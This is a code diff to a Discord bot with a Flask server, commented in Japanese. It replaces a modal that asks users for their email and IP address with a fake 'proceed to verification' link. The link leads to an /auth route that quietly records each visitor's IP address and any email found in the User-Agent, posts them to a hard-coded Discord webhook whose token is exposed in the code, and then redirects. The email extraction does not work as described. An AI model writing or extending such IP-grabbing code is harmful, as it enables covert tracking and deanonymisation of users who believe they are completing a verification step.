@@ -1,7 +1,7 @@
 import os
 import threading
 import logging
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, redirect
 import discord
 from discord.ext import commands
 import requests
@@ -79,33 +79,41 @@ def extract_ip_and_email(message):
 
 # --- スラッシュコマンドの定義 ---
 
-class AuthModal(discord.ui.Modal):
-    def __init__(self):
-        super().__init__(title="認証情報入力")
-        self.email_input = discord.ui.TextInput(label="メールアドレス", placeholder="your.email@example.com", required=True)
-        self.ip_input = discord.ui.TextInput(label="IPアドレス", placeholder="192.168.1.1", required=True)
-        self.add_item(self.email_input)
-        self.add_item(self.ip_input)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        email = self.email_input.value
-        ip = self.ip_input.value
-
-        # Webhookに送信
-        user_info = f"ユーザー: {interaction.user.mention}\nユーザーID: {interaction.user.id}\n"
-        data = {
-            "content": f"{user_info}IPアドレス: {ip}\nメールアドレス: {email}"
-        }
-        WEBHOOK_URL = "https://discord.com/api/webhooks/1440776757392441414/0x-51OAe945GtlPK0BY6k3zf34675GLZWL8K7N6AmQ3QnWLBn-nL6yvuWXIG1tjrpwZh"
-        requests.post(WEBHOOK_URL, json=data)
-
-        await interaction.response.send_message("認証情報を受け取りました。", ephemeral=True)
-
 @bot.tree.command(name="認証パネル設置", description="ユーザーの認証情報を収集します。")
 async def auth_panel_setup(interaction: discord.Interaction):
-    # 認証パネルを表示
-    modal = AuthModal()
-    await interaction.response.send_modal(modal)
+    # 認証ボタンを表示
+    view = discord.ui.View()
+    button = discord.ui.Button(label="認証に進む", url="https://example.com/auth")
+    view.add_item(button)
+    await interaction.response.send_message("認証ボタンを押してください。", view=view, ephemeral=False)
+
+# --- Flaskルートの追加 ---
+
+@app.route("/auth", methods=["GET"])
+def auth():
+    # ここでは、ユーザーがサイトにアクセスした際のIPアドレスとメールアドレスを抽出します
+    user_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+
+    # ユーザーエージェントからメールアドレスを抽出（例として、ユーザーエージェントにメールアドレスが含まれている場合）
+    email = extract_email_from_user_agent(user_agent)
+
+    # Webhookに送信
+    user_info = f"ユーザーIP: {user_ip}\n"
+    data = {
+        "content": f"{user_info}メールアドレス: {email}"
+    }
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1440776757392441414/0x-51OAe945GtlPK0BY6k3zf34675GLZWL8K7N6AmQ3QnWLBn-nL6yvuWXIG1tjrpwZh"
+    requests.post(WEBHOOK_URL, json=data)
+
+    return redirect("https://example.com/thanks")  # 認証完了ページにリダイレクト
+
+def extract_email_from_user_agent(user_agent):
+    # ユーザーエージェントからメールアドレスを抽出するロジックをここに追加
+    # ここでは簡単のため、ユーザーエージェントに直接メールアドレスが含まれていると仮定
+    email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
+    emails = email_pattern.findall(user_agent)
+    return emails[0] if emails else "メールアドレスが見つかりません"
 
 # --- メイン実行 ---
 
